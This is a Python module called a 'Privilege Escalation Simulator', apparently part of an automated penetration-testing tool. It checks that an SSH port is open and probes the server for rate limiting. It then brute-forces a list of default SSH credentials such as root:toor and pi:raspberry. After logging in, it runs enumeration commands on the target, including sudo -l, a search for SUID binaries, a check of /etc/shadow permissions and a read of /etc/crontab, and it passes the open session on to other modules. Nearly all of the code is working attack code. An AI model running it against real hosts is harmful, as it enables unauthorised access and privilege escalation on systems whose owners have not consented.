"""
Privilege Escalation Simulator Module
"""
import paramiko
import time
import socket
from typing import Dict, Any, Tuple
from urllib.parse import urlparse
from paramiko.ssh_exception import SSHException


def is_ssh_port_open(hostname: str, port: int = 22, timeout: int = 3) -> Tuple[bool, str]:
    """
    Issue #33: Pre-check SSH port availability before attempting connections.
    
    Returns:
        (is_open: bool, message: str)
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((hostname, port))
        sock.close()
        
        if result == 0:
            return (True, f"Port {port} is open on {hostname}")
        else:
            return (False, f"Port {port} is closed or filtered on {hostname}")
    except socket.gaierror:
        return (False, f"Hostname {hostname} could not be resolved")
    except Exception as e:
        return (False, f"Port check failed: {str(e)}")


def detect_ssh_rate_limiting(hostname: str, port: int = 22) -> Tuple[bool, str]:
    """
    Issue #22: Detect SSH rate limiting before attempting credential brute-force.
    
    Performs 3 rapid intentionally-failed auth probes and measures:
    - Response delay patterns
    - Connection drop behavior
    - Exponential backoff indicators
    
    Returns:
        (is_rate_limited: bool, message: str)
    """
    delays = []
    connection_failures = 0
    
    for attempt in range(3):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        start_time = time.time()
        try:
            # Intentionally fail with invalid credentials
            ssh.connect(
                hostname=hostname,
                username="__rate_limit_test__",
                password="__invalid__",
                port=port,
                timeout=10,
                look_for_keys=False,
                allow_agent=False,
                banner_timeout=10
            )
        except paramiko.AuthenticationException:
            # Expected - authentication failed as intended
            elapsed = time.time() - start_time
            delays.append(elapsed)
        except (paramiko.SSHException, OSError, EOFError) as e:
            # Connection was dropped/reset - strong indicator of rate limiting
            connection_failures += 1
            elapsed = time.time() - start_time
            delays.append(elapsed)
        except Exception as e:
            # Unexpected error
            return (False, f"Rate limit detection inconclusive: {str(e)}")
        finally:
            ssh.close()
        
        # Small delay between probes (100ms)
        if attempt < 2:
            time.sleep(0.1)
    
    # Analysis
    # 1. Check for connection drops
    if connection_failures >= 2:
        return (True, f"SSH rate limiting detected: {connection_failures}/3 connections dropped/reset")
    
    # 2. Check for exponential delay pattern
    if len(delays) == 3:
        # If each delay is significantly longer than the previous (>50% increase)
        if delays[1] > delays[0] * 1.5 and delays[2] > delays[1] * 1.5:
            return (True, f"SSH rate limiting detected: exponential delay pattern ({delays[0]:.2f}s → {delays[1]:.2f}s → {delays[2]:.2f}s)")
        
        # If any single auth attempt takes >5 seconds (artificial delay)
        if any(d > 5.0 for d in delays):
            return (True, f"SSH rate limiting detected: artificial delay (max {max(delays):.2f}s)")
    
    # No rate limiting detected
    avg_delay = sum(delays) / len(delays) if delays else 0
    return (False, f"No rate limiting detected (avg delay: {avg_delay:.2f}s)")


def execute_remote_command(ssh_client: paramiko.SSHClient, command: str) -> Dict[str, str]:
    """Execute a single command via SSH and parse the streams."""
    try:
        stdin, stdout, stderr = ssh_client.exec_command(command, timeout=15)
        # Wait for the command to finish and get exit status
        exit_status = stdout.channel.recv_exit_status()
        out = stdout.read().decode('utf-8', errors='replace').strip()
        err = stderr.read().decode('utf-8', errors='replace').strip()
        return {"command": command, "stdout": out, "stderr": err, "exit_status": exit_status}
    except Exception as e:
        return {"command": command, "error": str(e)}

def try_default_ssh_credentials(hostname: str, port: int = 22) -> Dict[str, Any]:
    """
    Issue #14: Attempt common default SSH credentials.
    Issue #32 & #33: Clean error handling with port pre-check.
    Only called if rate limiting check passes.
    
    Returns:
        {
            "success": bool,
            "credentials": {"username": str, "password": str} or None,
            "attempts": int,
            "message": str
        }
    """
    # Issue #33: Pre-check SSH port before brute-force
    port_open, port_msg = is_ssh_port_open(hostname, port)
    if not port_open:
        return {
            "success": False,
            "credentials": None,
            "attempts": 0,
            "message": f"[!] {port_msg} — skipping SSH brute-force."
        }
    
    # Short list of common default credentials
    default_creds = [
        ("admin", "admin"),
        ("root", "root"),
        ("root", "toor"),
        ("admin", "password"),
        ("pi", "raspberry"),
        ("user", "user"),
        ("ubuntu", "ubuntu"),
        ("test", "test")
    ]
    
    for username, password in default_creds:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            ssh.connect(
                hostname=hostname,
                username=username,
                password=password,
                port=port,
                timeout=10,
                look_for_keys=False,
                allow_agent=False
            )
            
            # Success!
            ssh.close()
            return {
                "success": True,
                "credentials": {"username": username, "password": password},
                "attempts": default_creds.index((username, password)) + 1,
                "message": f"✓ Default credentials found: {username}:{password}"
            }
            
        except paramiko.AuthenticationException:
            # Expected - credentials didn't work, try next
            pass
        except SSHException as e:
            # Issue #32: Clean SSH error messages
            return {
                "success": False,
                "credentials": None,
                "attempts": default_creds.index((username, password)) + 1,
                "message": f"[!] SSH error: {str(e)} — skipping."
            }
        except EOFError:
            # Issue #32: SSH port closed or not an SSH service
            return {
                "success": False,
                "credentials": None,
                "attempts": default_creds.index((username, password)) + 1,
                "message": "[!] SSH port closed or not an SSH service — aborting brute-force."
            }
        except socket.error as e:
            # Issue #32: Network/socket errors
            return {
                "success": False,
                "credentials": None,
                "attempts": default_creds.index((username, password)) + 1,
                "message": f"[!] SSH connection failed: {str(e)}"
            }
        except Exception as e:
            # Issue #32: Catch-all for unexpected errors with clean message
            return {
                "success": False,
                "credentials": None,
                "attempts": default_creds.index((username, password)) + 1,
                "message": f"[!] Unexpected error during brute-force: {type(e).__name__}: {str(e)}"
            }
        finally:
            ssh.close()
        
        # Small delay between attempts (500ms) to be slightly respectful
        time.sleep(0.5)
    
    return {
        "success": False,
        "credentials": None,
        "attempts": len(default_creds),
        "message": f"No default credentials found (tried {len(default_creds)} combinations)"
    }


def run_privesc(config: Dict[str, Any], ssh_creds: Dict[str, str]) -> Tuple[Dict[str, Any], Any]:
    """
    Main entry point for the Privilege Escalation Simulator.
    Establishes an SSH connection and runs automated enumeration vectors.
    
    Issue #27: Returns both results dict AND the SSH session object for downstream modules.
    
    Returns:
        (results: Dict[str, Any], ssh_session: paramiko.SSHClient or None)
    """
    target_url = config.get('target', '')
    parsed = urlparse(target_url if '://' in target_url else f'http://{target_url}')
    target = parsed.hostname or target_url.split(':')[0]
    
    results: Dict[str, Any] = {
        "status": "pending",
        "target": target,
        "auth_used": ssh_creds.get('username'),
        "findings": {}
    }

    # Initialize SSH Client
    ssh = paramiko.SSHClient()
    # Automatically add unknown host keys
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Connect
        ssh.connect(
            hostname=target,
            username=ssh_creds.get('username'),
            password=ssh_creds.get('password'),
            timeout=10,
            look_for_keys=False,
            allow_agent=False
        )
        results["status"] = "connected"

        # Enumeration Commands Dictionary
        enum_commands = {
            "sudo_privileges": "sudo -n -l 2>/dev/null",
            "suid_binaries": "find / -type f -perm -4000 2>/dev/null | grep -v 'snap\\|docker' | head -n 20",
            "shadow_writable": "ls -l /etc/shadow | awk '{print $1}'",
            "cron_jobs": "cat /etc/crontab 2>/dev/null",
            "os_release": "cat /etc/os-release | grep PRETTY_NAME"
        }

        # Execute and store results
        for key, cmd in enum_commands.items():
            run_result = execute_remote_command(ssh, cmd)
            results["findings"][key] = run_result
        
        # Issue #27: Return the OPEN SSH session for downstream modules
        return (results, ssh)

    except paramiko.AuthenticationException:
        # Issue #32: Clean error message
        results["status"] = "error"
        results["error_msg"] = "Authentication failed. Invalid username or password."
        ssh.close()
        return (results, None)
    except SSHException as e:
        # Issue #32: Clean SSH error message
        results["status"] = "error"
        results["error_msg"] = f"[!] SSH error: {str(e)} — connection failed."
        ssh.close()
        return (results, None)
    except EOFError:
        # Issue #32: SSH service not available
        results["status"] = "error"
        results["error_msg"] = "[!] SSH port closed or not an SSH service."
        ssh.close()
        return (results, None)
    except socket.error as e:
        # Issue #32: Network errors
        results["status"] = "error"
        results["error_msg"] = f"[!] Network error: {str(e)}"
        ssh.close()
        return (results, None)
    except Exception as e:
        # Issue #32: Catch-all with clean error (no traceback to user)
        results["status"] = "error"
        results["error_msg"] = f"[!] Unexpected error: {type(e).__name__}: {str(e)}"
        ssh.close()
        return (results, None)
